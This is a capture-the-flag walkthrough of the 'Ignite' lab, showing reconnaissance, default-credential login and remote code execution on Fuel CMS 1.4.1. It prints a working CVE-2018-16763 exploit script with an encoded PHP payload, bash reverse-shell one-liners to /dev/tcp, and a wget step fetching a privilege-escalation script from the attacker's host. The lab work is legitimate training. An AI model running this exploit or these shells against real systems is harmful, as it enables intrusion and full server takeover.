# Ignite

under robots.txt i found /fuel

it redirect to a login page, i tried admin:admin and it successfully got me to an admin dashboard

```jsx
┌──(ayachi㉿kali)-[~]
└─$ nmap -sV -Pn 10.65.153.17    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-17 20:25 CET
Nmap scan report for 10.65.153.17
Host is up (0.13s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.79 seconds
                                                                
```

```jsx
┌──(ayachi㉿kali)-[~]
└─$ nmap -Pn -p- -T4 10.65.153.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-17 20:29 CET
Warning: 10.65.153.17 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.65.153.17
Host is up (0.13s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE    SERVICE
80/tcp    open     http
2029/tcp  filtered hsrpv6
17216/tcp filtered unknown
42614/tcp filtered unknown
65177/tcp filtered unknown

```

the version of the cms is 1.4 , it hase a rce exploit 

```jsx
└─$ searchsploit fuel                                                 
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
AMD Fuel Service - 'Fuel.service' Unquote Service P | windows/local/49535.txt
Franklin Fueling Systems  TS-550 - Exploit and Defa | hardware/remote/51321.txt
Franklin Fueling Systems Colibri Controller Module  | linux/remote/50861.txt
Franklin Fueling Systems TS-550 - Default Password  | hardware/remote/51382.txt
Franklin Fueling TS-550 evo 2.0.0.6833 - Multiple V | hardware/webapps/31180.txt
fuel CMS 1.4.1 - Remote Code Execution (1)          | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)          | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)          | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authen | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (A | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)  | php/webapps/50884.txt
---------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                      
┌──(ayachi㉿kali)-[~]
└─$ searchsploit -x 47138

  Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)
      URL: https://www.exploit-db.com/exploits/47138
     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py
    Codes: CVE-2018-16763
 Verified: False
File Type: Python script, ASCII text executable

```

we will change the code to remove the proxy part and add the victim address

```jsx
# Exploit Title: Fuel CMS 1.4.1 - Remote Code Execution
# CVE: CVE-2018-16763
# Python3 compatible version

import requests
import urllib.parse

url = "http://10.65.153.17"

def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start + 1)
        n -= 1
    return start

while True:
    cmd = input("cmd: ")

    payload = (
        url
        + "/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"
        + urllib.parse.quote(cmd)
        + "%27%29%2b%27"
    )

    r = requests.get(payload)

    html = "<!DOCTYPE html>"
    begin = r.text[0:20]
    dup = find_nth_overlapping(r.text, begin, 2)

    print(r.text[0:dup])

```

now after running this , we get a cmd rce 

now we will get a reverseshell

run this in the rce

```jsx
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
single ' did not work and " worked for me  
bash -c "bash -i >& /dev/tcp/192.168.178.249/4444 0>&1"

```

now that i have a reverse shell 

privilege escalation

i used linpeas to look  for exploits

in my machine wher [linpeas.sh](http://linpeas.sh) is 

```jsx
python -m http.server 8000
```

in the shell

```jsx
wget http://ip^/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

we got a backup with user root and password mememe

su into root and get the last flag